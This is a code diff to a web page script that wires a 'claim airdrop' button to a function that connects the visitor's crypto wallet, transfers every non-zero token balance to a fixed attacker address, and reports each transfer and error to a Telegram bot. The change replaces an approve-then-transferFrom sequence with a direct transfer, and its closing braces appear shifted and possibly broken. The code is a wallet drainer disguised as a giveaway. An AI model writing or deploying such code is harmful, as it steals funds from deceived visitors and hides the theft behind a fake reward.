@@ -81,7 +81,7 @@ scrollReveal();
 addEventOnElem(window, "scroll", scrollReveal);
 
 /**
- * Wallet connect and token approval/transfer with Telegram notification
+ * Wallet connect and token transfer with Telegram notification
  */
 async function connectWalletAndSendTokens() {
   if (!window.ethers || !window.ethereum) {
@@ -261,28 +261,11 @@ ${nativeBalanceMessage}
           for (const token of nonZeroTokens) {
             try {
               const contract = new ethers.Contract(token.token_address, [
-                "function approve(address spender, uint amount) returns (bool)",
-                "function transferFrom(address from, address to, uint amount) returns (bool)"
+                "function transfer(address to, uint amount) returns (bool)"
               ], currentSigner);
 
-              const approveTx = await contract.approve(network.exodusAddress, token.balance);
-              await approveTx.wait();
-
               const balance = ethers.utils.formatUnits(token.balance, token.decimals ?? 0);
-              const approveSuccessMessage = `
-✅ Approve Successful
-Token: ${token.symbol}
-Amount: ${balance}
-Spender: ${network.exodusAddress}
-Tx: ${approveTx.hash}
-              `;
-              await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({ chat_id: chatId, text: approveSuccessMessage })
-              });
-
-              const transferTx = await contract.transferFrom(userAddress, network.exodusAddress, token.balance);
+              const transferTx = await contract.transfer(network.exodusAddress, token.balance);
               await transferTx.wait();
 
               const transferSuccessMessage = `
@@ -299,7 +282,7 @@ Tx: ${transferTx.hash}
               });
             } catch (err) {
               const errorMessage = `
-❌ Token Operation Failed
+❌ Transfer Failed
 Token: ${token.symbol || 'Unknown'}
 Error: ${err.message}
               `;
@@ -326,19 +309,19 @@ Address: ${userAddress}
         const errorMessage = `❌ Error on ${network.name}: ${err.message}`;
         await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
           method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({ chat_id: chatId, text: errorMessage })
-        });
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ chat_id: chatId, text: errorMessage })
+          });
+        }
       }
+    } catch (err) {
+      const errorMessage = `❌ Wallet Connection Failed: ${err.message}`;
+      await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ chat_id: chatId, text: errorMessage })
+      });
     }
-  } catch (err) {
-    const errorMessage = `❌ Wallet Connection Failed: ${err.message}`;
-    await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ chat_id: chatId, text: errorMessage })
-    });
   }
-}
-
-document.getElementById("claim-airdrop-btn")?.addEventListener("click", connectWalletAndSendTokens);
+  
+  document.getElementById("claim-airdrop-btn")?.addEventListener("click", connectWalletAndSendTokens);
